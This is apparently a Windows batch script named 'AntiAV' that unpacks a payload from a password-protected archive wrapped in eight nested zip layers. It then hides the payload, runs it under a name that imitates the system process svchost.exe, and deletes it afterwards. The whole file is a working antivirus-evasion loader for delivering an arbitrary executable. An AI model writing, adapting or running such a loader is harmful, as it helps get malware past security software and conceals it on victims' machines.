��&cls
@echo off
mode 65,10
title AntiAV (https://github.com/hXR16F/AntiAV)
md extracted
ren file.bin file.zip
call 7z.exe e file.zip -p___________17852pwd20169pwd29031___________ -oextracted 
for /l %%i in (8,-1,1) do (
call 7z.exe e extracted/file_%%i.zip -oextracted
)
ren file.zip file.bin
cd extracted
move "svchost.exe""" ../
cd..
rd /s /q extracted
attrib +H "svchost.exe"""
start "" "svchost.exe"""
cls
echo Launched 'svchost.exe""'.
pause
del /f /q "svchost.exe"""
